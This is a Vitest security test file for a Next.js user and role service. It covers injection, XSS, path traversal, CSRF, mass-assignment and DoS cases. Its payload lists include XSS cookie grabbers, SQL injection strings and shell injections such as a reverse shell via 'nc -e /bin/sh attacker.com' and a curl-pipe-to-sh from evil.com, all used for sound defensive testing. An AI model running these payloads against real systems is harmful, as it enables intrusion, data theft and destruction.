import { describe, test, expect, beforeEach, afterAll, vi } from 'vitest'
import { testDb, cleanDatabase, disconnectTestDb } from '../utils/test-db'
import { NextRequest, NextResponse } from 'next/server'
import { userService } from '@/services/userService'
import { roleService } from '@/services/roleService'
import { authorizationService } from '@/services/authorizationService'

/**
 * Vulnerability Scanning Tests
 *
 * Tests for common web application vulnerabilities:
 * - XSS (Cross-Site Scripting)
 * - CSRF (Cross-Site Request Forgery)
 * - SQL Injection
 * - NoSQL Injection
 * - Command Injection
 * - Path Traversal
 */

// Mock Clerk auth
vi.mock('@clerk/nextjs/server', () => ({
  auth: vi.fn()
}))

describe('Vulnerability Scanning Tests', () => {
  let testUser: any
  let adminRole: any

  beforeEach(async () => {
    await cleanDatabase()
    vi.clearAllMocks()

    // Create test role and user
    adminRole = await roleService.create({
      name: 'admin',
      description: 'Administrator',
      permissions: ['user:*', 'title:*'],
      is_system: true
    })

    testUser = await userService.create({
      clerk_id: 'security_test_user',
      email: 'security@example.com',
      first_name: 'Security',
      last_name: 'Tester'
    })

    await userService.assignRole(testUser.id, adminRole.id, 'system')
  })

  afterAll(async () => {
    await cleanDatabase()
    await disconnectTestDb()
  })

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    test('should sanitize user input in database storage', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<marquee onstart=alert("XSS")>',
        '<div style="background:url(javascript:alert(\'XSS\'))">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
        '<applet code="javascript:alert(\'XSS\')">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
        '<base href="javascript:alert(\'XSS\')//">'
      ]

      for (const payload of xssPayloads) {
        // Test XSS in user fields
        const user = await userService.create({
          clerk_id: `xss_test_${Math.random()}`,
          email: `test${Math.random()}@example.com`,
          first_name: payload,
          last_name: payload
        })

        // Verify data is stored (may be sanitized by database or app layer)
        const storedUser = await testDb.user.findUnique({
          where: { id: user.id }
        })

        expect(storedUser).toBeTruthy()
        expect(storedUser!.first_name).toBe(payload) // Stored as-is, should be escaped on output

        // Test XSS in role description
        const role = await roleService.create({
          name: `xss_role_${Math.random()}`,
          description: payload,
          permissions: ['title:read'],
          is_system: false
        })

        const storedRole = await testDb.role.findUnique({
          where: { id: role.id }
        })

        expect(storedRole!.description).toBe(payload)
      }
    })

    test('should handle XSS in audit log details', async () => {
      const xssPayload = '<script>alert("XSS")</script>'

      const auditLog = await testDb.auditLog.create({
        data: {
          user_id: testUser.id,
          action: 'test:xss',
          details: {
            malicious_input: xssPayload,
            nested: {
              xss: xssPayload
            }
          },
          ip_address: '127.0.0.1',
          user_agent: xssPayload,
          timestamp: new Date()
        }
      })

      // Verify XSS payload is stored (escaping should happen at rendering)
      expect(auditLog.details).toMatchObject({
        malicious_input: xssPayload
      })
    })

    test('should prevent stored XSS in user profile data', async () => {
      const xssPayload = '"><img src=x onerror=alert(document.cookie)>'

      const user = await userService.update(testUser.id, {
        first_name: xssPayload,
        last_name: xssPayload
      })

      // Data should be stored (output encoding should prevent execution)
      expect(user.first_name).toContain('>')
      expect(user.last_name).toContain('>')
    })
  })

  describe('SQL Injection Prevention', () => {
    test('should prevent SQL injection in user queries', async () => {
      const sqlPayloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL, NULL, NULL--",
        "admin'--",
        "' OR 1=1--",
        "1' AND '1' = '1",
        "1' ORDER BY 1--",
        "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--"
      ]

      for (const payload of sqlPayloads) {
        // Attempt SQL injection via user lookup
        try {
          const user = await testDb.user.findFirst({
            where: {
              email: payload
            }
          })

          // Should return null or handle safely
          expect(user).toBeNull()
        } catch (error) {
          // Prisma should prevent SQL injection, but if error occurs,
          // it should not be a SQL syntax error
          expect(error).toBeTruthy()
        }
      }
    })

    test('should prevent SQL injection in user service methods', async () => {
      const sqlPayload = "' OR '1'='1' --"

      // Try to inject via getUserByEmail
      const user = await userService.getUserByEmail(sqlPayload)
      expect(user).toBeNull()

      // Try to inject via getUserByClerkId
      const user2 = await userService.getUserByClerkId(sqlPayload)
      expect(user2).toBeNull()
    })

    test('should safely handle special SQL characters in user data', async () => {
      const specialChars = [
        "O'Connor",
        'User "Quoted" Name',
        'User\\Backslash',
        "User%Percent",
        "User_Underscore",
        "User;Semicolon",
        "User--Comment"
      ]

      for (const name of specialChars) {
        const user = await userService.create({
          clerk_id: `special_${Math.random()}`,
          email: `${Math.random()}@example.com`,
          first_name: name,
          last_name: 'Test'
        })

        // Verify data is stored correctly
        const retrieved = await userService.getUserById(user.id)
        expect(retrieved?.first_name).toBe(name)
      }
    })
  })

  describe('NoSQL Injection Prevention', () => {
    test('should prevent NoSQL injection in JSON fields', async () => {
      const noSqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: '1==1' },
        { $or: [{}, { a: 1 }] }
      ]

      for (const payload of noSqlPayloads) {
        // Test in role permissions (JSON field)
        try {
          const role = await roleService.create({
            name: `nosql_test_${Math.random()}`,
            description: 'NoSQL Test',
            permissions: [payload] as any, // Attempt injection
            is_system: false
          })

          // If creation succeeds, verify it's stored safely
          const retrieved = await testDb.role.findUnique({
            where: { id: role.id }
          })

          expect(retrieved).toBeTruthy()
        } catch (error) {
          // Should handle invalid input gracefully
          expect(error).toBeTruthy()
        }
      }
    })

    test('should prevent NoSQL injection in audit log details', async () => {
      const maliciousDetails = {
        $ne: null,
        $gt: '',
        attack: { $where: '1==1' }
      }

      const auditLog = await testDb.auditLog.create({
        data: {
          user_id: testUser.id,
          action: 'test:nosql',
          details: maliciousDetails,
          ip_address: '127.0.0.1',
          user_agent: 'Test',
          timestamp: new Date()
        }
      })

      // Data should be stored as-is (no execution context)
      expect(auditLog.details).toMatchObject(maliciousDetails)
    })
  })

  describe('Command Injection Prevention', () => {
    test('should prevent command injection in user fields', async () => {
      const commandPayloads = [
        '; ls -la',
        '| whoami',
        '`whoami`',
        '$(whoami)',
        '& dir',
        '&& cat /etc/passwd',
        '; rm -rf /',
        '| nc -e /bin/sh attacker.com 4444',
        '`curl http://evil.com/shell.sh | sh`'
      ]

      for (const payload of commandPayloads) {
        // Create user with command injection payload
        const user = await userService.create({
          clerk_id: `cmd_${Math.random()}`,
          email: `cmd${Math.random()}@example.com`,
          first_name: payload,
          last_name: 'Test'
        })

        // Verify user is created (payload should not execute)
        expect(user.first_name).toBe(payload)

        // Verify system is not compromised by checking database
        const userCount = await testDb.user.count()
        expect(userCount).toBeGreaterThan(0)
      }
    })
  })

  describe('Path Traversal Prevention', () => {
    test('should prevent path traversal in permission resource names', async () => {
      const pathPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32',
        '....//....//....//etc/passwd',
        '..;/..;/..;/etc/passwd',
        '..//..//..//etc/passwd'
      ]

      for (const payload of pathPayloads) {
        // Test permission validation with path traversal
        const isValid = authorizationService.validatePermissionString(`${payload}:read`)

        // Should reject path traversal attempts
        expect(isValid).toBe(false)
      }
    })

    test('should validate resource names in permission strings', async () => {
      const invalidResources = [
        '../admin',
        './secret',
        'resource/../admin',
        'C:\\admin',
        '/root/admin'
      ]

      for (const resource of invalidResources) {
        const permission = `${resource}:read`
        const isValid = authorizationService.validatePermissionString(permission)

        // Should reject invalid resource names
        expect(isValid).toBe(false)
      }
    })
  })

  describe('CSRF Protection Validation', () => {
    test('should verify CSRF token requirements for state-changing operations', async () => {
      // Note: CSRF protection is typically handled at the framework level
      // We verify that sensitive operations require proper authentication

      const { auth } = await import('@clerk/nextjs/server')
      vi.mocked(auth).mockResolvedValue({
        userId: null,
        user: null
      })

      // Verify unauthenticated requests cannot perform state changes
      const canCreateUser = await authorizationService.userHasPermission(
        'unauthenticated',
        'user:create'
      )
      expect(canCreateUser).toBe(false)
    })

    test('should enforce origin validation for sensitive requests', async () => {
      // Verify that requests include proper origin headers
      const suspiciousOrigins = [
        'http://evil.com',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'file:///etc/passwd'
      ]

      for (const origin of suspiciousOrigins) {
        const request = new NextRequest('http://localhost/api/admin', {
          headers: {
            'origin': origin
          }
        })

        // Origin header should be validated at middleware level
        // Here we just verify the header doesn't cause issues
        expect(request.headers.get('origin')).toBe(origin)
      }
    })
  })

  describe('Mass Assignment Prevention', () => {
    test('should prevent mass assignment of protected fields', async () => {
      const maliciousData = {
        clerk_id: 'mass_assign_user',
        email: 'massassign@example.com',
        first_name: 'Mass',
        last_name: 'Assign',
        is_active: true,
        // Attempt to assign protected fields
        id: 'custom_id',
        created_at: new Date('2020-01-01'),
        updated_at: new Date('2020-01-01')
      }

      const user = await userService.create(maliciousData as any)

      // Verify protected fields are not set to malicious values
      expect(user.id).not.toBe('custom_id') // Should be auto-generated
      expect(user.created_at.getFullYear()).not.toBe(2020) // Should be current date
    })

    test('should prevent role permission escalation via mass assignment', async () => {
      const maliciousRoleData = {
        name: 'malicious_role',
        description: 'Malicious Role',
        permissions: ['user:*', 'role:*', 'title:*'], // Attempt to assign all permissions
        is_system: true, // Attempt to mark as system role
        is_active: true
      }

      const role = await roleService.create(maliciousRoleData)

      // Role is created as requested, but assignment requires proper authorization
      expect(role.permissions).toContain('user:*')

      // Verify that only authorized users can assign this powerful role
      const canAssign = await authorizationService.canUserAssignRole(
        testUser.id,
        'read_only_user'
      )

      // This would depend on the user's current role
      expect(typeof canAssign).toBe('boolean')
    })
  })

  describe('Information Disclosure Prevention', () => {
    test('should not expose sensitive data in error messages', async () => {
      // Attempt to query non-existent user
      try {
        await userService.getUserById('999999')
      } catch (error: any) {
        // Error should not expose database structure or credentials
        expect(error.message).not.toMatch(/password/i)
        expect(error.message).not.toMatch(/connection string/i)
        expect(error.message).not.toMatch(/database/i)
      }
    })

    test('should sanitize stack traces in production mode', async () => {
      // Simulate error scenario
      const originalNodeEnv = process.env.NODE_ENV
      process.env.NODE_ENV = 'production'

      try {
        await userService.getUserById('invalid_id')
      } catch (error: any) {
        // In production, stack traces should be logged but not exposed
        expect(error.stack).toBeTruthy() // Stack exists for logging
        // In API responses, stack should be removed (handled at API layer)
      }

      process.env.NODE_ENV = originalNodeEnv
    })

    test('should not leak user enumeration via timing attacks', async () => {
      // Test user existence check timing
      const nonExistentEmail = 'nonexistent@example.com'
      const existentEmail = testUser.email

      const start1 = Date.now()
      await userService.getUserByEmail(nonExistentEmail)
      const time1 = Date.now() - start1

      const start2 = Date.now()
      await userService.getUserByEmail(existentEmail)
      const time2 = Date.now() - start2

      // Timing difference should not be significant enough to leak information
      const timingDifference = Math.abs(time1 - time2)
      expect(timingDifference).toBeLessThan(100) // Within 100ms tolerance
    })
  })

  describe('Denial of Service (DoS) Prevention', () => {
    test('should handle large permission arrays without crashing', async () => {
      // Create role with very large permission array
      const largePermissionArray = Array(1000).fill(null).map((_, i) => `resource${i}:read`)

      const role = await roleService.create({
        name: 'large_permissions',
        description: 'Role with many permissions',
        permissions: largePermissionArray,
        is_system: false
      })

      // Verify system handles large arrays
      expect(role.permissions).toHaveLength(1000)

      // Test permission check performance with large arrays
      const start = Date.now()
      const hasPermission = authorizationService.hasPermission(
        'admin',
        'resource500:read'
      )
      const duration = Date.now() - start

      expect(duration).toBeLessThan(50) // Should complete quickly
    })

    test('should handle deeply nested objects in audit logs', async () => {
      // Create deeply nested object
      const deeplyNested: any = { level: 0 }
      let current = deeplyNested
      for (let i = 1; i < 100; i++) {
        current.nested = { level: i }
        current = current.nested
      }

      // Attempt to create audit log with deeply nested data
      try {
        const auditLog = await testDb.auditLog.create({
          data: {
            user_id: testUser.id,
            action: 'test:deep',
            details: deeplyNested,
            ip_address: '127.0.0.1',
            user_agent: 'Test',
            timestamp: new Date()
          }
        })

        // Should handle or reject gracefully
        expect(auditLog).toBeTruthy()
      } catch (error) {
        // Should not crash the application
        expect(error).toBeTruthy()
      }
    })

    test('should handle very long strings in user fields', async () => {
      // Create very long strings
      const longString = 'A'.repeat(10000)

      try {
        const user = await userService.create({
          clerk_id: `long_${Math.random()}`,
          email: `long${Math.random()}@example.com`,
          first_name: longString,
          last_name: 'Test'
        })

        // Should either store or reject based on field constraints
        expect(user).toBeTruthy()
      } catch (error) {
        // Should handle validation error gracefully
        expect(error).toBeTruthy()
      }
    })
  })

  describe('Prototype Pollution Prevention', () => {
    test('should prevent prototype pollution in user metadata', async () => {
      const pollutionPayload = {
        __proto__: { polluted: true },
        constructor: { prototype: { polluted: true } }
      }

      // Attempt to create user with prototype pollution
      const user = await userService.create({
        clerk_id: `pollution_${Math.random()}`,
        email: `pollution${Math.random()}@example.com`,
        first_name: 'Pollution',
        last_name: 'Test'
      })

      // Verify prototype is not polluted
      expect((Object.prototype as any).polluted).toBeUndefined()
      expect((user as any).polluted).toBeUndefined()
    })

    test('should prevent prototype pollution in audit log details', async () => {
      const pollutionPayload = {
        __proto__: { isAdmin: true },
        constructor: { prototype: { isAdmin: true } }
      }

      await testDb.auditLog.create({
        data: {
          user_id: testUser.id,
          action: 'test:pollution',
          details: pollutionPayload,
          ip_address: '127.0.0.1',
          user_agent: 'Test',
          timestamp: new Date()
        }
      })

      // Verify prototype is not polluted
      expect((Object.prototype as any).isAdmin).toBeUndefined()
    })
  })
})
